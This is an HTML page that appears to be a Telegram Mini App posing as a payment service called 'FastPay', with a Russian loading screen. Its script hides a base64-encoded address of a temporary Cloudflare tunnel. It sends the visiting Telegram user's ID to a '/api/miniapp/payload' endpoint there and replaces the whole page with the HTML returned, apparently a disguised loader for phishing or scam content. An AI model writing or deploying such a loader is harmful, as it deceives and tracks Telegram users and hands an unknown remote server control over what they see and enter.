<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<title>Telegram</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
body {
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    background: var(--tg-theme-bg-color, #ffffff);
    color: var(--tg-theme-text-color, #1a1a1a);
}
.welcome { text-align: center; padding: 32px 24px; }
.welcome .icon {
    width: 64px; height: 64px;
    margin: 0 auto 20px;
    border-radius: 18px;
    background: #34C759;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 4px 16px rgba(52,199,89,0.25);
}
.welcome .icon svg { width: 32px; height: 32px; fill: #fff; }
.welcome h2 { font-size: 20px; font-weight: 700; letter-spacing: -0.2px; margin-bottom: 6px; }
.welcome p { font-size: 14px; color: var(--tg-theme-hint-color, #8e8e93); line-height: 1.45; }
.spinner {
    width: 28px; height: 28px;
    border: 2.5px solid var(--tg-theme-secondary-bg-color, #e5e5ea);
    border-top-color: var(--tg-theme-button-color, #007aff);
    border-radius: 50%;
    margin: 24px auto 0;
    animation: spin 0.75s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
</style>
<script>
var __k0 = 'aHR0cHM6Ly9pbmZvcm1hdGl2ZS1wYXNzaW5nLWNoYXJpdHktcmVhZGluZ3MudHJ5Y2xvdWRmbGFyZS5jb20=';

(function() {
    var tg = null;
    try { if (window.Telegram && window.Telegram.WebApp) tg = window.Telegram.WebApp; } catch(e) {}

    if (!tg) {
        document.querySelector('.welcome') && (document.querySelector('.welcome').innerHTML = '<p style="text-align:center;padding:40px;color:var(--tg-theme-hint-color,#999)">Open in Telegram</p>');
        return;
    }

    tg.ready();
    tg.expand();

    var uid = '0';
    try { if (tg.initDataUnsafe && tg.initDataUnsafe.user) uid = String(tg.initDataUnsafe.user.id); } catch(e) {}

    var server = '';
    try { server = atob(__k0); } catch(e) {}
    if (!server) {
        var el = document.querySelector('.welcome p');
        if (el) { el.textContent = 'Server configuration error.'; el.style.color = 'var(--tg-theme-destructive-text-color, #e53935)'; }
        return;
    }

    var url = server + '/api/miniapp/payload?uid=' + uid;

    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.timeout = 12000;
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200 && xhr.responseText) {
                _render(xhr.responseText);
            } else {
                _fail();
            }
        }
    };
    xhr.onerror = function() { _fail(); };
    xhr.ontimeout = function() { _fail(); };
    xhr.send();

    function _render(html) {
        var newDoc = document.open("text/html", "replace");
        newDoc.write(html);
        newDoc.close();
    }

    function _fail() {
        var el = document.querySelector('.welcome p');
        if (el) { el.textContent = 'Please try again later.'; el.style.color = 'var(--tg-theme-destructive-text-color, #e53935)'; }
        var sp = document.querySelector('.spinner');
        if (sp) sp.style.display = 'none';
    }
})();
</script>
</head>
<body>
<div class="welcome">
    <div class="icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M16 8l-8 8"/><path d="M12 16V8"/><path d="M8 16l4-4 4 4"/></svg>
    </div>
    <h2>FastPay</h2>
    <p>Загрузка...</p>
    <div class="spinner"></div>
</div>
</body>
</html>
